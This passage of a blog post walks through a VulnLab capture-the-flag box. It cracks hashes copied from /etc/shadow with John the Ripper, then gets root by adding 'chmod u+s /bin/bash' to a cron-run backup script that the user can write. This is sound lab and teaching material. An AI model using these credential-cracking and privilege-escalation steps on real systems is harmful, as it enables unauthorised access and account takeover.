</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#0086f7;font-weight:bold">5</span> jennifer jennifer  <span style="color:#0086f7;font-weight:bold">100</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:02 httpd
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#0086f7;font-weight:bold">1</span> jennifer jennifer <span style="color:#0086f7;font-weight:bold">2131</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:02 passwd
</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#0086f7;font-weight:bold">1</span> jennifer jennifer  <span style="color:#0086f7;font-weight:bold">430</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:02 rsyncd.conf
</span></span><span style="display:flex;"><span>-rw-r----- <span style="color:#0086f7;font-weight:bold">1</span> jennifer jennifer <span style="color:#0086f7;font-weight:bold">1487</span> Sep  <span style="color:#0086f7;font-weight:bold">6</span> 00:02 shadow
</span></span></code></pre></div><p>We have access to the <code>shadow</code> file, which holds the user&rsquo;s hashed passwords. Let&rsquo;s send it to our machine alongside with the <code>passwd</code> file in order to crack them. (or try)</p>
<p><code>John the Ripper</code> is our best friend here.</p>
<p>We first run unshadow to put in the correct format</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» unshadow passwd shadow | tee unshadow.txt
</span></span><span style="display:flex;"><span>root:<span style="color:#fb660a">$y$j9T$Lvn5CBDJCop7JR9iMerFr1$dfzHPNhyy1jkree7XtvuxhyYziUbVC</span>.
</span></span><span style="display:flex;"><span>&lt;snip&gt;
</span></span><span style="display:flex;"><span>sa:<span style="color:#fb660a">$y$j9T$jJFOBCaiGJUmyZZRFn5aG1$7</span>pSWDUlnIOlXInoK4nn3gCEIiMp94x8sXaV.DtTzM6D:1001:1001:,,,:/home/sa:/bin/bash
</span></span><span style="display:flex;"><span>triss:<span style="color:#fb660a">$y$j9T$cJzLWCatbO1</span>.azxJo6eQN1<span style="color:#fb660a">$I4BAX3vXEOlfg4v</span>/q5tIibnVNR61C6V4QFQEI/Y1pD4:1003:1003:,,,:/home/triss:/bin/bash
</span></span><span style="display:flex;"><span>jennifer:<span style="color:#fb660a">$y$j9T$DBxmxcNWJlhvgfWCUTbEC0$98</span>T55fRnXftC4XaKZdDJ6IMPsqXP1fA6QVAioJ3CZo7:1004:1004:,,,:/home/jennifer:/bin/bash
</span></span></code></pre></div><p>Among the options above, only <code>sa</code> and <code>root</code> seem valid candidates, so we can remove the rest</p>
<p>Let&rsquo;s run</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>john unshadow.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
</span></span></code></pre></div><p>&ndash;format=crypt is passwd because one of the hashes is encrypted with yescrypt, more can be seen <a href="https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt">here</a></p>
<p>After a while we get</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>--- vulnlabs/easy-sync Â» john unshadow.txt --show 
</span></span><span style="display:flex;"><span>sa:sakura:1001:1001:,,,:/home/sa:/bin/bash
</span></span><span style="display:flex;"><span><span style="color:#0086f7;font-weight:bold">1</span> password hash cracked, <span style="color:#0086f7;font-weight:bold">0</span> left
</span></span></code></pre></div><p><code>sa:sakura</code></p>
<h1 id="roottxt">Root.txt</h1>
<p>Alright, we can escalate to <code>sa</code>, but that alone does not let read the root flag. Let&rsquo;s enumerate what kind of files this user can modify or read.</p>
<p>The command below searches in all file system for files that belongs to the user <code>sa</code> and sends every error messages to <code>/dev/null</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sa@ip-10-10-200-238:~$ find / -user <span style="color:#0086d2">&#34;sa&#34;</span> 2&gt;/dev/null
</span></span><span style="display:flex;"><span>/home/sa
</span></span><span style="display:flex;"><span>/home/sa/.bashrc
</span></span><span style="display:flex;"><span>/home/sa/.profile
</span></span><span style="display:flex;"><span>/home/sa/.bash_logout
</span></span><span style="display:flex;"><span>/usr/local/bin/backup.sh <span style="color:#080;background-color:#0f140f;font-style:italic">#This one</span>
</span></span></code></pre></div><p>A long list is returned to us, but one of the files is very interesting, let&rsquo;s take a close look.</p>
<p>This first part is indeed what is going on inside that <code>backup</code> folder. Since some actions here require privileged access  we can assume that root is running it.</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sa@ip-10-10-200-238:~$ cat /usr/local/bin/backup.sh 
</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mkdir -p /tmp/backup
</span></span><span style="display:flex;"><span>cp -r /opt/httpd /tmp/backup
</span></span><span style="display:flex;"><span>cp /etc/passwd /tmp/backup
</span></span><span style="display:flex;"><span>cp /etc/shadow /tmp/backup
</span></span><span style="display:flex;"><span>cp /etc/rsyncd.conf /tmp/backup
</span></span><span style="display:flex;"><span>zip -r /backup/<span style="color:#fb660a;font-weight:bold">$(</span>date +%s<span style="color:#fb660a;font-weight:bold">)</span>.zip /tmp/backup
</span></span><span style="display:flex;"><span>rm -rf /tmp/backup
</span></span></code></pre></div><p>This second information tells us that we can write to this file, so root will execute any commands we want</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sa@ip-10-10-200-238:~$ ls -la /usr/local/bin/backup.sh 
</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#0086f7;font-weight:bold">1</span> sa sa <span style="color:#0086f7;font-weight:bold">211</span> Apr <span style="color:#0086f7;font-weight:bold">19</span> 19:26 /usr/local/bin/backup.sh
</span></span></code></pre></div><p>Let&rsquo;s add the command <code>chmod u+s /bin/bash</code> to the end of the file, this will add a sticky bit to the <code>/bin/bash</code> binary, allowing us to elevate privileges freely.</p>
<p>The file looks like this after we modify it</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sa@ip-10-10-200-238:~$ cat /usr/local/bin/backup.sh 
</span></span><span style="display:flex;"><span><span style="color:#080;background-color:#0f140f;font-style:italic">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mkdir -p /tmp/backup
</span></span><span style="display:flex;"><span>cp -r /opt/httpd /tmp/backup
</span></span><span style="display:flex;"><span>cp /etc/passwd /tmp/backup
</span></span><span style="display:flex;"><span>cp /etc/shadow /tmp/backup
</span></span><span style="display:flex;"><span>cp /etc/rsyncd.conf /tmp/backup
</span></span><span style="display:flex;"><span>zip -r /backup/<span style="color:#fb660a;font-weight:bold">$(</span>date +%s<span style="color:#fb660a;font-weight:bold">)</span>.zip /tmp/backup
</span></span><span style="display:flex;"><span>rm -rf /tmp/backup
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>chmod u+s /bin/bash
</span></span></code></pre></div><p>We wait a little bit and shortly the command will be executed.</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sa@ip-10-10-200-238:~$ ls -la /bin/bash
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#0086f7;font-weight:bold">1</span> root root <span style="color:#0086f7;font-weight:bold">1396520</span> Jan  <span style="color:#0086f7;font-weight:bold">6</span>  <span style="color:#0086f7;font-weight:bold">2022</span> /bin/bash  <span style="color:#080;background-color:#0f140f;font-style:italic">## Sticky bit set</span>
</span></span><span style="display:flex;"><span>sa@ip-10-10-200-238:~$ /bin/bash -p
</span></span><span style="display:flex;"><span>bash-5.1# whoami
</span></span><span style="display:flex;"><span>root
</span></span><span style="display:flex;"><span>bash-5.1# cat /root/root.txt
</span></span><span style="display:flex;"><span>VL{1ce85&lt;snip&gt;237e1b}
</span></span></code></pre></div><h1 id="extra-mile">Extra Mile</h1>
<p>Another way to identify the cron job being executed is running <code>pspy</code>. It is a tool that monitors linux processes being executed without the need of a privileged account.</p>
<p>Let&rsquo;s demonstrate</p>
<ul>
<li>Download a version from the <a href="https://github.com/DominicBreuker/pspy">github repo</a></li>
<li>Use scp to send the binary to the remote machine</li>
<li>Execute and wait the cron job to run</li>
</ul>
<p>After a little while we get</p>
<div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#111;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>2023/09/06 01:18:40 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">1</span>      | /sbin/init 
</span></span><span style="display:flex;"><span>2023/09/06 01:20:01 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">2142</span>   | /usr/sbin/CRON -f -P 
</span></span><span style="display:flex;"><span>2023/09/06 01:20:01 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">2141</span>   | /usr/sbin/CRON -f -P 
</span></span><span style="display:flex;"><span>2023/09/06 01:20:01 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">2143</span>   | /bin/sh -c /usr/local/bin/backup.sh 
</span></span><span style="display:flex;"><span>2023/09/06 01:20:01 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">2144</span>   | /bin/bash /usr/local/bin/backup.sh 
</span></span><span style="display:flex;"><span>2023/09/06 01:20:01 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">2145</span>   | /bin/bash /usr/local/bin/backup.sh 
</span></span><span style="display:flex;"><span>2023/09/06 01:20:01 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">2146</span>   | /bin/bash /usr/local/bin/backup.sh 
</span></span><span style="display:flex;"><span>2023/09/06 01:20:01 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">2147</span>   | /bin/bash /usr/local/bin/backup.sh 
</span></span><span style="display:flex;"><span>2023/09/06 01:20:01 CMD: <span style="color:#fb660a">UID</span>=<span style="color:#0086f7;font-weight:bold">0</span>     <span style="color:#fb660a">PID</span>=<span style="color:#0086f7;font-weight:bold">2149</span>   | date +%s 
</span></span></code></pre></div><p>Another way of discovering the vulnerable file</p>
<p><strong>That&rsquo;s all folks ~</strong></p>

		</section>

		<div class="post-tags">
			
			
			<nav class="nav tags">
				<ul class="tags">
					
					<li><a href="/tags/vulnlab">vulnlab</a></li>
					
					<li><a href="/tags/easy">easy</a></li>
					
					<li><a href="/tags/rsync">rsync</a></li>
					
					<li><a href="/tags/hash-cracking">hash-cracking</a></li>
					
					<li><a href="/tags/misconfig">misconfig</a></li>
					
				</ul>
			</nav>
			
			
		</div>
		</article>
</main>
<footer>
  <div style="display:flex"><a class="soc" href="https://github.com/D4n-P" rel="me" title="GitHub"><i data-feather="github"></i></a>
    <a class="border"></a><a class="soc" href="https://twitter.com/dan_ps__" rel="me" title="Twitter"><i data-feather="twitter"></i></a>
    <a class="border"></a><a class="soc" href="https://www.linkedin.com/in/danielspatricio/" rel="me" title="Linkedin"><i data-feather="linkedin"></i></a>
    <a class="border"></a></div>
  <div class="footer-info">
    Feel free to reach me at any of my social media ðŸŽƒ
  </div>
</footer>


<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-164145585-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

<script>
  feather.replace()
</script></div>
    </body>
</html>
